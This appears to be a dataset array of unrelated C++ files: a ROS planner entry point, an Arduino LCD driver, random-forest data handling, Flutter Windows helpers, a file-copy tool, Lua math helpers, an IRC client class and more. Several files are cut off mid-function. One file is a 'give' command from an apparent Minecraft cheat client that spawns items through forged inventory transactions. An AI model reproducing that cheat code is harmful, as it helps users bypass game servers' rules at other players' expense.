    "/*******************************************************************************\n * Software License Agreement (BSD License)\n *\n * Copyright (c) 2022 Zhang Zhimeng\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without modification,\n * are permitted provided that the following conditions are met:\n *\n * 1. Redistributions of source code must retain the above copyright notice,\n *    this list of conditions and the following disclaimer.\n *\n * 2. Redistributions in binary form must reproduce the above copyright notice,\n *    this list of conditions and the following disclaimer in the documentation\n *    and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\n * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT\n * SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n * TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY\n * WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n ******************************************************************************/\n\n#include <hybrid_a_star/hybrid_a_star_flow.h>\n#include <plan_manage/planner_manager.h>\n#include <3rd/backward.hpp>\n\n#include <ros/ros.h>\n\nnamespace backward {\nbackward::SignalHandling sh;\n}\n\nint main(int argc, char **argv) {\n    ros::init(argc, argv, \"opt_planner\");\n    ros::NodeHandle node_handle(\"~\");\n    HybridAStarFlow kinodynamic_astar_flow(node_handle);\n    opt_planner::OPTPlannerManager opt_manager;\n    opt_planner::PlanningVisualization::Ptr visualization_; \n    visualization_.reset(new opt_planner::PlanningVisualization(node_handle));\n    // HybridAStarFlow::Ptr kinodynamic_astar_flow;\n    // kinodynamic_astar_flow->init(node_handle);\n    std::cout<<\"*************************************start*********************************\"<<std::endl;\n    opt_manager.initPlanModules(node_handle,visualization_);\n    ros::Rate rate(10);\n    \n    while (ros::ok()) {\n        // kinodynamic_astar_flow.Run();\n        // kinodynamic_astar_flow->Run();\n        opt_manager.run();\n\n        ros::spinOnce();\n        rate.sleep();\n    }\n\n    ros::shutdown();\n    return 0;\n}",
    "#include \"LiquidCrystal.h\"\n\n#include <stdio.h>\n#include <string.h>\n#include <inttypes.h>\n#include \"Arduino.h\"\n\n// When the display powers up, it is configured as follows:\n//\n// 1. Display clear\n// 2. Function set:\n//    DL = 1; 8-bit interface data\n//    N = 0; 1-line display\n//    F = 0; 5x8 dot character font\n// 3. Display on/off control:\n//    D = 0; Display off\n//    C = 0; Cursor off\n//    B = 0; Blinking off\n// 4. Entry mode set:\n//    I/D = 1; Increment by 1\n//    S = 0; No shift\n//\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\n// can't assume that its in that state when a sketch starts (and the\n// LiquidCrystal constructor is called).\n\nLiquidCrystal::LiquidCrystal(uint8_t rs, uint8_t rw, uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3,\n\t\t\t     uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7)\n{\n  init(0, rs, rw, enable, d0, d1, d2, d3, d4, d5, d6, d7);\n}\n\nLiquidCrystal::LiquidCrystal(uint8_t rs, uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3,\n\t\t\t     uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7)\n{\n  init(0, rs, 255, enable, d0, d1, d2, d3, d4, d5, d6, d7);\n}\n\nLiquidCrystal::LiquidCrystal(uint8_t rs, uint8_t rw, uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3)\n{\n  init(1, rs, rw, enable, d0, d1, d2, d3, 0, 0, 0, 0);\n}\n\nLiquidCrystal::LiquidCrystal(uint8_t rs,  uint8_t enable,\n\t\t\t     uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3)\n{\n  init(1, rs, 255, enable, d0, d1, d2, d3, 0, 0, 0, 0);\n}\n\nvoid LiquidCrystal::init(uint8_t fourbitmode, uint8_t rs, uint8_t rw, uint8_t enable,\n\t\t\t uint8_t d0, uint8_t d1, uint8_t d2, uint8_t d3,\n\t\t\t uint8_t d4, uint8_t d5, uint8_t d6, uint8_t d7)\n{\n  _rs_pin = rs;\n  _rw_pin = rw;\n  _enable_pin = enable;\n\n  _data_pins[0] = d0;\n  _data_pins[1] = d1;\n  _data_pins[2] = d2;\n  _data_pins[3] = d3;\n  _data_pins[4] = d4;\n  _data_pins[5] = d5;\n  _data_pins[6] = d6;\n  _data_pins[7] = d7;\n\n  if (fourbitmode)\n    _displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\n  else\n    _displayfunction = LCD_8BITMODE | LCD_1LINE | LCD_5x8DOTS;\n\n  begin(16, 1);\n}\n\nvoid LiquidCrystal::begin(uint8_t cols, uint8_t lines, uint8_t dotsize) {\n  if (lines > 1) {\n    _displayfunction |= LCD_2LINE;\n  }\n  _numlines = lines;\n\n  setRowOffsets(0x00, 0x40, 0x00 + cols, 0x40 + cols);\n\n  // for some 1 line displays you can select a 10 pixel high font\n  if ((dotsize != LCD_5x8DOTS) && (lines == 1)) {\n    _displayfunction |= LCD_5x10DOTS;\n  }\n\n  pinMode(_rs_pin, OUTPUT);\n  // we can save 1 pin by not using RW. Indicate by passing 255 instead of pin#\n  if (_rw_pin != 255) {\n    pinMode(_rw_pin, OUTPUT);\n  }\n  pinMode(_enable_pin, OUTPUT);\n\n  // Do these once, instead of every time a character is drawn for speed reasons.\n  for (int i=0; i<((_displayfunction & LCD_8BITMODE) ? 8 : 4); ++i)\n  {\n    pinMode(_data_pins[i], OUTPUT);\n   }\n\n  // SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\n  // according to datasheet, we need at least 40ms after power rises above 2.7V\n  // before sending commands. Arduino can turn on way before 4.5V so we'll wait 50\n  delayMicroseconds(50000);\n  // Now we pull both RS and R/W low to begin commands\n  digitalWrite(_rs_pin, LOW);\n  digitalWrite(_enable_pin, LOW);\n  if (_rw_pin != 255) {\n    digitalWrite(_rw_pin, LOW);\n  }\n\n  //put the LCD into 4 bit or 8 bit mode\n  if (! (_displayfunction & LCD_8BITMODE)) {\n    // this is according to the hitachi HD44780 datasheet\n    // figure 24, pg 46\n\n    // we start in 8bit mode, try to set 4 bit mode\n    write4bits(0x03);\n    delayMicroseconds(4500); // wait min 4.1ms\n\n    // second try\n    write4bits(0x03);\n    delayMicroseconds(4500); // wait min 4.1ms\n\n    // third go!\n    write4bits(0x03);\n    delayMicroseconds(150);\n\n    // finally, set to 4-bit interface\n    write4bits(0x02);\n  } else {\n    // this is according to the hitachi HD44780 datasheet\n    // page 45 figure 23\n\n    // Send function set command sequence\n    command(LCD_FUNCTIONSET | _displayfunction);\n    delayMicroseconds(4500);  // wait more than 4.1ms\n\n    // second try\n    command(LCD_FUNCTIONSET | _displayfunction);\n    delayMicroseconds(150);\n\n    // third go\n    command(LCD_FUNCTIONSET | _displayfunction);\n  }\n\n  // finally, set # lines, font size, etc.\n  command(LCD_FUNCTIONSET | _displayfunction);\n\n  // turn the display on with no cursor or blinking default\n  _displaycontrol = LCD_DISPLAYON | LCD_CURSOROFF | LCD_BLINKOFF;\n  display();\n\n  // clear it off\n  clear();\n\n  // Initialize to default text direction (for romance languages)\n  _displaymode = LCD_ENTRYLEFT | LCD_ENTRYSHIFTDECREMENT;\n  // set the entry mode\n  command(LCD_ENTRYMODESET | _displaymode);\n\n}\n\nvoid LiquidCrystal::setRowOffsets(int row0, int row1, int row2, int row3)\n{\n  _row_offsets[0] = row0;\n  _row_offsets[1] = row1;\n  _row_offsets[2] = row2;\n  _row_offsets[3] = row3;\n}\n\n/********** high level commands, for the user! */\nvoid LiquidCrystal::clear()\n{\n  command(LCD_CLEARDISPLAY);  // clear display, set cursor ",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized-random-forest.\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include <algorithm>\n#include <cmath>\n#include <numeric>\n#include <iterator>\n#include <stdexcept>\n\n#include \"Data.h\"\n\nnamespace grf {\n\nData::Data(const double* data_ptr, size_t num_rows, size_t num_cols) {\n  if (data_ptr == nullptr) {\n    throw std::runtime_error(\"Invalid data storage: nullptr\");\n  }\n  this->data_ptr = data_ptr;\n  this->num_rows = num_rows;\n  this->num_cols = num_cols;\n}\n\nData::Data(const std::vector<double>& data, size_t num_rows, size_t num_cols) :\n  Data(data.data(), num_rows, num_cols) {}\n\nData::Data(const std::pair<std::vector<double>, std::vector<size_t>>& data) :\n  Data(data.first.data(), data.second.at(0), data.second.at(1)) {}\n\nvoid Data::set_outcome_index(size_t index) {\n  set_outcome_index(std::vector<size_t>({index}));\n}\n\nvoid Data::set_outcome_index(const std::vector<size_t>& index) {\n  this->outcome_index = index;\n  disallowed_split_variables.insert(index.begin(), index.end());\n}\n\nvoid Data::set_treatment_index(size_t index) {\n  set_treatment_index(std::vector<size_t>({index}));\n}\n\nvoid Data::set_treatment_index(const std::vector<size_t>& index) {\n  this->treatment_index = index;\n  disallowed_split_variables.insert(index.begin(), index.end());\n}\n\nvoid Data::set_instrument_index(size_t index) {\n  this->instrument_index = index;\n  disallowed_split_variables.insert(index);\n}\n\nvoid Data::set_weight_index(size_t index) {\n  this->weight_index = index;\n  disallowed_split_variables.insert(index);\n}\n\nvoid Data::set_causal_survival_numerator_index(size_t index) {\n  this->causal_survival_numerator_index = index;\n  disallowed_split_variables.insert(index);\n}\n\nvoid Data::set_causal_survival_denominator_index(size_t index) {\n  this->causal_survival_denominator_index = index;\n  disallowed_split_variables.insert(index);\n}\n\nvoid Data::set_censor_index(size_t index) {\n  this->censor_index = index;\n  disallowed_split_variables.insert(index);\n}\n\nstd::vector<size_t> Data::get_all_values(std::vector<double>& all_values,\n                                         std::vector<size_t>& sorted_samples,\n                                         const std::vector<size_t>& samples,\n                                         size_t var) const {\n  all_values.resize(samples.size());\n  for (size_t i = 0; i < samples.size(); i++) {\n    size_t sample = samples[i];\n    all_values[i] = get(sample, var);\n  }\n\n  sorted_samples.resize(samples.size());\n  std::vector<size_t> index(samples.size());\n   // fill with [0, 1,..., samples.size() - 1]\n  std::iota(index.begin(), index.end(), 0);\n  // sort index based on the split values (argsort)\n  // the NaN comparison places all NaNs at the beginning\n  // stable sort is needed for consistent element ordering cross platform,\n  // otherwise the resulting sums used in the splitting rules may compound rounding error\n  // differently and produce different splits.\n  std::stable_sort(index.begin(), index.end(), [&](const size_t& lhs, const size_t& rhs) {\n    return all_values[lhs] < all_values[rhs] || (std::isnan(all_values[lhs]) && !std::isnan(all_values[rhs]));\n  });\n\n  for (size_t i = 0; i < samples.size(); i++) {\n    sorted_samples[i] = samples[index[i]];\n    all_values[i] = get(sorted_samples[i], var);\n  }\n\n  all_values.erase(unique(all_values.begin(), all_values.end(), [&](const double& lhs, const double& rhs) {\n    return lhs == rhs || (std::isnan(lhs) && std::isnan(rhs));\n  }), all_values.end());\n\n  return index;\n}\n\nsize_t Data::get_num_cols() const {\n  return num_cols;\n}\n\nsize_t Data::get_num_rows() const {\n  return num_rows;\n}\n\nsize_t Data::get_num_outcomes() const {\n  if (outcome_index.has_value()) {\n    return outcome_index.value().size();\n  } else {\n    return 1;\n  }\n}\n\nsize_t Data::get_num_treatments() const {\n  if (treatment_index.has_value()) {\n    return treatment_index.value().size();\n  } else {\n    return 1;\n  }\n}\n\nconst std::set<size_t>& Data::get_disallowed_split_variables() const {\n  return disallowed_split_variables;\n}\n\n} // namespace grf\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"../include/copyOperator.h\"\n\n/**\n * @brief \u68c0\u67e5\u90a3\u4e9b\u65e0\u6548\u7684\u547d\u4ee4\u884c\u53c2\u6570\u8f93\u5165\uff0c\n *        \u5728 argc \u4e3a 1\uff08\u6ca1\u6709\u53c2\u6570\uff09\u4ee5\u53ca\u5927\u4e8e 3\uff08\u53c2\u6570\u8fc7\u591a\uff09\u65f6\uff0c\u8fd4\u56de false\n * \n * @param __argCount    \u53c2\u6570\u6570\u91cf\n * \n * @return \u547d\u4ee4\u884c\u53c2\u6570\u6570\u91cf\u662f\u5426\u5408\u7406\n*/\ninline bool checkInvalidArgc(const int __argCount) { return (__argCount == 1) || (__argCount > 3); };\n\nint main(int argc, char const *argv[])\n{\n    system(clearCommand);\n\n    FileCopyOperator FileCopyOp;\n\n    if (checkInvalidArgc(argc)) { ERROR_LOG(\"Not or invalid argument!\\n\"); FileCopyOp.showHelp(); }\n\n    else if ((std::strcmp(argv[1], \"--help\") == 0) && argc == 2) { FileCopyOp.showHelp(); }\n\n    else if ((std::strcmp(argv[1], \"--version\") == 0) && argc == 2) { FileCopyOp.showVersion(); }\n\n    else if (argc == 3) \n    {   \n        int64_t costTime = TIMER( FileCopyOp.copyFile(argv[1], argv[2]) );\n\n        if (costTime >= 1500) { ERROR_LOG(\"Copy cost [\" + std::to_string(costTime) + \"] ms.\\n\"); }\n        else\n        {\n            CORRECT_LOG(\"Copy cost [\" + std::to_string(costTime) + \"] ms.\\n\");\n        }\n\n        printSplitLine(45, '-');\n    }\n    else \n    {\n        ERROR_LOG(\"Invalid argument!\\n\"); \n        FileCopyOp.showHelp();\n    }\n\n    DONE\n    return EXIT_SUCCESS;\n}\n",
    "/*********************************************\n// Created by m1556 on 2024/4/13 19:47.\n*********************************************/\n#include <cmath>\n#include <stdexcept>\n\n#include \"lua_math.h\"\n\n\n\nbool convertToBoolean(Lua_type *val){\n    switch (val->get_type()) {\n        case Lua_type::Kind::Nil:{\n            return false;\n        }\n        case Lua_type::Kind::Boolean:{\n            return val->as<bool>()->get_value();\n        }\n        default:{\n            return true;\n        }\n    }\n}\n\nlong long IFloorDiv(long long a, long long b){\n    if ((a > 0 && b > 0) || (a < 0 && b < 0) || a % b == 0){\n        return a / b;\n    } else {\n        return a / b - 1;\n    }\n}\n\ndouble FFloorDiv(double a, double b){\n    return floor(a / b);\n}\n\nlong long IMod(long long a, long long b){\n    return a - IFloorDiv(a, b) * b;\n}\n\ndouble FMod(double a, double b){\n    return a - floor(a / b) * b;\n}\n\nlong long ShiftLeft(long long a, long long n){\n    if (n >= 0){\n        return a << n;\n    } else {\n        return ShiftRight(a, -n);\n    }\n}\n\nlong long ShiftRight(long long a, long long n){\n    if (n >= 0){\n        return a >> n;\n    } else {\n        return ShiftLeft(a, -n);\n    }\n}\n\nlong long FloatToInteger(double f, bool &flag){\n    auto ret = (long long) f;\n    flag = ((double) ret) == f;\n    return ret;\n}\n\nlong long ParseInteger(std::string str, bool &flag){\n    long long val = 0;\n    try {\n        val = std::stoll(str);\n    } catch (const std::invalid_argument& e){\n        flag = false;\n        return 0;\n    } catch (const std::out_of_range& e){\n        flag = false;\n        return 0;\n    } catch (...){\n        flag = false;\n        return 0;\n    }\n    flag = true;\n    return val;\n}\n\ndouble ParseFloat(std::string str, bool &flag){\n    double val = 0;\n    try {\n        val = std::stod(str);\n    } catch (const std::invalid_argument& e){\n        flag = false;\n        return 0;\n    } catch (const std::out_of_range& e){\n        flag = false;\n        return 0;\n    } catch (...){\n        flag = false;\n        return 0;\n    }\n    flag = true;\n    return val;\n}\n\ndouble convertToFloat(Lua_type *val, bool &flag){\n    switch (val->get_type()) {\n        case Lua_type::Kind::Number:{\n            flag = true;\n            return val->as<double>()->get_value();\n        }\n        case Lua_type::Kind::Integer:{\n            flag = true;\n            return (double) val->as<long long>()->get_value();\n        }\n        case Lua_type::Kind::String:{\n            return ParseFloat(val->as<std::string>()->get_value(), flag);\n        }\n        case Lua_type::Kind::Boolean:{\n            return val->as<bool>()->get_value();\n        }\n        default:{\n            flag = false;\n            return 0;\n        }\n    }\n}\n\nlong long convertToInteger(Lua_type *val, bool &flag) {\n    switch (val->get_type()) {\n        case Lua_type::Kind::Integer: {\n            flag = true;\n            return val->as<long long>()->get_value();\n        }\n        case Lua_type::Kind::Number: {\n            return FloatToInteger(\n                    val->as<double>()->get_value(),\n                    flag\n                    );\n        }\n        case Lua_type::Kind::String: {\n            return stringToInteger_(\n                    val->as<std::string>()->get_value(),\n                    flag\n                    );\n        }\n        default: {\n            flag = false;\n            return 0;\n        }\n    }\n}\n\nlong long stringToInteger_(std::string str, bool &flag) {\n     bool f_val = false;\n     long long val = ParseInteger(str, f_val);\n     if (f_val) {\n         flag = true;\n         return val;\n     }\n\n     double d_value = ParseInteger(str, f_val);\n    if (f_val) {\n        flag = true;\n        return (long long)d_value;\n    }\n    flag = false;\n\n    return 0;\n}",
    "#include \"GiveCommand.h\"\n\n#include \"../../../SDK/Tag.h\"\n#include \"../../../Utils/Utils.h\"\n\nGiveCommand::GiveCommand() : IMCCommand(\"give\", \"spawn items\", \"<itemName> <count> [itemData] [NBT]\") {\n}\n\nGiveCommand::~GiveCommand() {\n}\nbool isValidNBT(std::string &tag) {\n\treturn tag.size() > 1 && tag.front() == MojangsonToken::COMPOUND_START.getSymbol() && tag.back() == MojangsonToken::COMPOUND_END.getSymbol();\n}\n\nbool GiveCommand::execute(std::vector<std::string> *args) {\n\tassertTrue(args->size() > 2);\n\n\tint itemId = 0;\n\tuint32_t fullCount = static_cast<uint32_t>(assertInt(args->at(2)));\n\tunsigned int stackCount = fullCount / 64;\n\tunsigned int count = fullCount % 64;\n\tunsigned int itemData = 0;\n\n\tif (args->size() > 3) {\n\t\titemData = assertInt(args->at(3));\n\t}\n\n\ttry {\n\t\titemId = std::stoi(args->at(1));\n\t} catch (const std::invalid_argument &) {\n\t}\n\n\tfor (unsigned int i = 0; i < stackCount; i++) {\n\t\tstd::string tag;\n\t\tbool success = false;\n\n\t\tif (args->size() > 4) {\n\t\t\ttag = Utils::getClipboardText();\n\t\t}\n\n\t\tif (itemId == 0) {\n\t\t\tTextHolder tempText(args->at(1));\n\t\t\tsuccess = giveItem(64, tempText, itemData, tag);\n\t\t} else {\n\t\t\tsuccess = giveItem(64, itemId, itemData, tag);\n\t\t}\n\n\t\tif (!success) {\n\t\t\treturn true;\n\t\t}\n\t}\n\n\tif (count >= 1) {\n\t\tstd::string tag;\n\t\tbool success = false;\n\n\t\tif (args->size() > 4) {\n\t\t\ttag = Utils::getClipboardText();\n\t\t}\n\n\t\tif (itemId == 0) {\n\t\t\tTextHolder tempText(args->at(1));\n\t\t\tsuccess = giveItem(count, tempText, itemData, tag);\n\t\t} else {\n\t\t\tsuccess = giveItem(count, itemId, itemData, tag);\n\t\t}\n\n\t\tif (!success) {\n\t\t\treturn true;\n\t\t}\n\t}\n\n\tInventory *inv = Game.getLocalPlayer()->getSupplies()->inventory;\n\tItemStack *item = Game.getLocalPlayer()->getSelectedItem();\n\n\tif (args->size() > 4) {\n\t\tstd::string tag = Utils::getClipboardText();\n\n\t\tif (isValidNBT(tag)) {\n\t\t\titem->setUserData(std::move(Mojangson::parseTag(tag)));\n\t\t} else {\n\t\t\tclientMessageF(\"%sInvalid NBT tag!\", RED);\n\t\t\treturn true;\n\t\t}\n\n\t\tif (args->size() > 4) {\n\t\t\tGame.getLocalPlayer()->getTransactionManager()->addInventoryAction(InventoryAction(0, item, nullptr, InventorySource(NonImplementedFeatureTODO, inventory, NoFlag)));\n\t\t}\n\n\t\tclientMessageF(\"%s%s\", GREEN, \"Successfully loaded mojangson !\");\n\t}\n\n\tif (args->size() > 4) {\n\t\tInventoryAction *firstAction = nullptr;\n\t\tauto transactionMan = Game.getLocalPlayer()->getTransactionManager();\n\t\tfirstAction = new InventoryAction(0, item, nullptr);\n\t\ttransactionMan->addInventoryAction(*firstAction);\n\t\tinv->addItemToFirstEmptySlot(item);\n\t\tdelete firstAction;\n\t}\n\n\tclientMessageF(\"%sSuccessfully gave items!\", GREEN);\n\treturn true;\n}\n\nbool GiveCommand::giveItem(uint8_t count, int itemId, uint8_t itemData, std::string &tag) {\n\tInventory *inv = Game.getLocalPlayer()->getSupplies()->inventory;\n\tItemStack *itemStack = nullptr;\n\tauto transactionManager = Game.getLocalPlayer()->getTransactionManager();\n\n\tvoid *ItemPtr;\n\tItem ***cStack = ItemRegistry::getItemFromId(&ItemPtr, itemId);\n\n\tif (cStack == nullptr || *cStack == nullptr || **cStack == nullptr) {\n\t\tclientMessageF(\"%sInvalid item ID!\", RED);\n\t\treturn false;\n\t}\n\n\titemStack = new ItemStack(***cStack, count, itemData);\n\tint slot = inv->getFirstEmptySlot();\n\n\tif (tag.size() > 1 && tag.front() == MojangsonToken::COMPOUND_START.getSymbol() && tag.back() == MojangsonToken::COMPOUND_END.getSymbol()) {\n\t\titemStack->fromTag(*Mojangson::parseTag(tag));\n\t}\n\n\tInventoryAction *firstAction = new InventoryAction(slot, itemStack, nullptr, InventorySource(NonImplementedFeatureTODO, inventory, NoFlag));\n\ttransactionManager->addInventoryAction(*firstAction);\n\tinv->addItemToFirstEmptySlot(itemStack);\n\n\tdelete firstAction;\n\treturn true;\n}\n\nbool GiveCommand::giveItem(uint8_t count, TextHolder &text, uint8_t itemData, std::string &tag) {\n\tInventory *inv = Game.getLocalPlayer()->getSupplies()->inventory;\n\tItemStack *itemStack = nullptr;\n\tauto transactionManager = Game.getLocalPlayer()->getTransactionManager();\n\n\tvoid *ItemPtr;\n\tvoid *buffer;\n\tItem ***cStack = ItemRegistry::lookUpByName(&ItemPtr, &buffer, text);\n\n\tif (*cStack == nullptr) {\n\t\tclientMessageF(\"%sInvalid item name!\", RED);\n\t\treturn false;\n\t}\n\n\titemStack = new ItemStack(***cStack, count, itemData);\n\tint slot = inv->getFirstEmptySlot();\n\n\tif (tag.size() > 1 && tag.front() == MojangsonToken::COMPOUND_START.getSymbol() && tag.back() == MojangsonToken::COMPOUND_END.getSymbol()) {\n\t\titemStack->fromTag(*Mojangson::parseTag(tag));\n\t}\n\n\tInventoryAction *firstAction = new InventoryAction(slot, itemStack, nullptr, InventorySource(NonImplementedFeatureTODO, inventory, NoFlag));\n\ttransactionManager->addInventoryAction(*firstAction);\n\tinv->addItemToFirstEmptySlot(itemStack);\n\n\tdelete firstAction;\n\treturn true;\n}",
    "#include \"../../include/core/Client.hpp\"\n#include \"../../include/core/Server.hpp\"\n#include \"../../include/core/Channel.hpp\"\n\n#include <iostream>\n\nClient::Client(int fd)\n\t: msg(fd), fd(fd), origin(false), passFlag(false), nickFlag(false),\n\t\tuserFlag(false), quitFlag(false), connectFlag(false), registerFlag(false) {};\n\nClient::~Client()\n{\n\tif (origin)\n\t{\n\t\tKqueue& kq = Server::getKq();\n\t\t// nickList\uc5d0\uc11c nickname\uc81c\uac70\n\t\tif (nickFlag)\n\t\t\tremoveNick();\n\t\t// kqueue\uc5d0\uc11c \uc81c\uac70\n\t\t\tkq.removeSocket(fd); // kq\uc5d0\uc11c \uc81c\uac70\n\t\t// \uc18c\ucf13 \ub2eb\uae30\n\t\t\tclose(fd);\n\t}\n}\n\nvoid Client::receiveMsg()\n{\n\t// \uba54\uc2dc\uc9c0\uc5d0 \ud074\ub77c\uc774\uc5b8\ud2b8\uac00 \ubcf4\ub0b8 \ub0b4\uc6a9\uc744 \uc800\uc7a5\n\tmsg.fillMsg();\n\t// \uba54\uc2dc\uc9c0\ub97c \uc800\uc7a5\ud558\ub2e4 \ubc1c\uc0dd\ud55c \uc5d0\ub7ec \uac10\uc9c0\n\tif (msg.getErrFlag())\n\t\tthrow std::runtime_error(\"recv() error\");\n}\n\nbool Client::isDisconnected()\n{\n\t// \uc5f0\uacb0\uc774 \ub04a\uacbc\ub294\uc9c0 \ud655\uc778\n\tif (msg.getEndFlag() || quitFlag)\n\t\treturn (true);\n\treturn (false);\n}\n\nbool Client::isCmdComplete()\n{\n\t// \uba54\uc2dc\uc9c0 \ubc84\ud37c\uc5d0 \uc788\ub294 \uba85\ub839\uc5b4\uac00 \uc644\uc131\ub410\ub294\uc9c0 \ud655\uc778\n\tif (msg.isComplete())\n\t\treturn (true);\n\treturn (false);\n}\n\nstd::string Client::getCmd()\n{\n\t// \uba54\uc2dc\uc9c0 \ubc18\ud658\n\treturn (msg.getCmd());\n}\n\nbool Client::isRegistered()\n{\n\treturn (registerFlag);\n}\n\n// <nickname \ud568\uc218\ub4e4>\n// nick\uc774 \uc720\ud6a8\ud55c nickname\uc778\uc9c0 \ud655\uc778\nbool Client::isInvalidNick(std::string& nick)\n{\n\tint size = nick.size();\n\tif (size > 30) return (true); // \uaddc\uce59 1. \uae38\uc774 \ucd5c\ub300 30\n\tif (!isalpha(nick[0])) return (true); // \uaddc\uce59 2. \ub9e8 \uc55e\uc740 \uc54c\ud30c\ubcb3\uc73c\ub85c \uc2dc\uc791\n\t\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tif (nick[i] == ' ') return (true); // \uaddc\uce59 3. \uacf5\ubc31 \ud3ec\ud568 x\n\t\telse if (!(isalpha(nick[i]) || isdigit(nick[i]) // \uaddc\uce59 4. \uc22b\uc790, \uc54c\ud30c\ubcb3, '-', '_' \ub9cc\uc73c\ub85c \uad6c\uc131\n\t\t\t|| nick[i] == '-' || nick[i] == '_'))\n\t\t\treturn (true);\n\t}\n\treturn (false);\n}\n\nbool Client::isNicknameInUse(std::string& nick)\n{\n\tstd::vector<std::string>& nickList = Server::getNickList();\n\n\tint size = nick.size();\n\t// \ub300\ubb38\uc790\ub97c \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\n\tstd::string lowercase;\n\tfor (int i = 0; i < size; i++)\n\t\tlowercase += tolower(nick[i]);\n\t\n\t// nickname \ub300\uc18c\ubb38\uc790 \uc0c1\uad00\uc5c6\uc774 \uc911\ubcf5 \uae08\uc9c0\n\tif (find(nickList.begin(), nickList.end(), lowercase) != nickList.end()) return (true);\n\treturn (false);\n}\n\nvoid Client::addNick(std::string nick)\n{\n\tstd::vector<std::string>& nickList = Server::getNickList();\n\n\t// nickname \uac31\uc2e0\n\tnickname = nick;\n\n\tint size = nick.size();\n\n\t// \ub300\ubb38\uc790\ub97c \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\n\tstd::string lowercase;\n\tfor (int i = 0; i < size; i++)\n\t\tlowercase += tolower(nick[i]);\n\t\n\t// nickList\uc5d0 \ucd94\uac00\n\tnickList.push_back(lowercase);\n}\n\nvoid Client::removeNick()\n{\n\tint size = nickname.size();\n\tif (size != 0)\n\t{\n\t\tstd::vector<std::string>& nickList = Server::getNickList();\n\n\t\t// \ub300\ubb38\uc790\ub97c \uc18c\ubb38\uc790\ub85c \ubcc0\ud658\n\t\tstd::string lowercase;\n\t\tfor (int i = 0; i < size; i++)\n\t\t\tlowercase += tolower(nickname[i]);\n\t\t// nickList\uc5d0\uc11c nick \uc81c\uac70\n\t\tnickList.erase(find(nickList.begin(), nickList.end(), lowercase));\n\t\t// channelList\uc5d0\uc11c \uc81c\uac70\n\t\tstd::vector<Channel*>::iterator iter = joinedChannels.begin();\n\t\tfor (; iter != joinedChannels.end(); iter++)\n\t\t{\n\t\t\t(*iter)->removeNickInChannel(*this);\n\t\t\tif ((*iter)->getSize() == 